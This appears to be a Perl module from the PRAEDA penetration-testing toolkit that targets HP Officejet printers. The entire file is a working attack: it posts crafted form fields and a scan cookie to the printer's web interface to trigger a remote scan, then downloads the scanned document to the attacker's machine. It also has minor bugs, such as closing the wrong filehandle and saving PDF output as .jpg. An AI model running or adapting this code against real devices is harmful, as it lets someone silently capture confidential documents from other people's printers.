# Officejet  Remote Scan
######################################################
#                    PRAEDA Module #MP0011           #
#        Copyright (C) 2011 Foofus.net		     #
#              Deral 'percX' Heiland                 #
######################################################
package MP0011;
sub MP0011
{
 
# Set global variables
my $count = 1;
my $TARGET = $_[1];
my $PORTS = $_[2];
my $web = $_[3];
my $OUTPUT = $_[4];
my $LOGFILE = $_[5];


#Open output file for loging 
open(OUTFILE, ">>./$OUTPUT/$LOGFILE.log") || die("Failed to open  Output file $LOGFILE.log \n");
     print "\n**********Attempting Officejet Remote Scan  $TARGET : JOB MP0011**********\n";
     print OUTFILE "\n**********Attempting Officejet Remote Scan $TARGET : JOB MP0011**********\n";

# Trigger scan and retrieve document from scan bed
my $browser = LWP::UserAgent->new(timeout => 180);
$browser->default_header(Cookie=> "HPAAWebscan=type%3D4%3Bfmt%3D1%3Bsize%3D0");

my $response = $browser->post("http$web://$TARGET:$PORTS/wsStatus.htm",
[
"ws_operation" => "1",
"ws_scanid" => "0",
"ws_type" => "0",
"ws_format" => "0",
"ws_size" => "0",
"ws_scan_method" => "0",
]);

my $scanning = $browser->get("http$web://$TARGET:$PORTS/scan/image.pdf?id=0&prev=1&time=123456789&type=4");
open(JOBSCANOUTFILE, ">>./$OUTPUT/$TARGET-$PORTS-scan.jpg") || die("Failed to open  Output file $TARGET-$PORTS-scan.jpg \n");
print JOBSCANOUTFILE $scanning->content;
print "***********Officejet scan job $TARGET-$PORTS-scan.jpg **********\n";
print OUTFILE "**********Officejet scan job $TARGET-$PORTS-scan.jpg **********\n";

# operation completed close out output files
close(JOBACCTOUTFILE);

close(OUTFILE);
}
1;
